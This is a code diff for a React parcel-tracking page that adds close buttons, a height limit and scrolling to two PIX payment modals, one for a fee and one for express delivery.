@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle, Calculator } from 'lucide-react';
+import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle, Calculator, X } from 'lucide-react';
 import { useSearchParams } from 'react-router-dom';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
@@ -396,7 +396,26 @@ const TrackingPage: React.FC = () => {
             {/* Modal Taxa */}
             {showTaxModal && trackingData?.taxa_valor && (
                 <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
-                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                    <div style={{
+                        background: 'rgba(20, 20, 25, 0.95)',
+                        border: '1px solid rgba(255,255,255,0.1)',
+                        borderRadius: '32px',
+                        width: '100%',
+                        maxWidth: '440px',
+                        maxHeight: '90vh',
+                        padding: '40px',
+                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
+                        animation: 'fadeIn 0.3s ease',
+                        textAlign: 'center',
+                        overflowY: 'auto',
+                        position: 'relative'
+                    }} onClick={e => e.stopPropagation()}>
+                        <button
+                            onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}
+                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
+                        >
+                            <X size={18} />
+                        </button>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Calculator size={40} color="#ef4444" />
                         </div>
@@ -536,7 +555,26 @@ const TrackingPage: React.FC = () => {
             {/* Modal Acelerar */}
             {showExpressModal && (
                 <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
-                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                    <div style={{
+                        background: 'rgba(20, 20, 25, 0.95)',
+                        border: '1px solid rgba(255,255,255,0.1)',
+                        borderRadius: '32px',
+                        width: '100%',
+                        maxWidth: '440px',
+                        maxHeight: '90vh',
+                        padding: '40px',
+                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
+                        animation: 'fadeIn 0.3s ease',
+                        textAlign: 'center',
+                        overflowY: 'auto',
+                        position: 'relative'
+                    }} onClick={e => e.stopPropagation()}>
+                        <button
+                            onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}
+                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
+                        >
+                            <X size={18} />
+                        </button>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Truck size={40} color="#6366f1" />
                         </div>
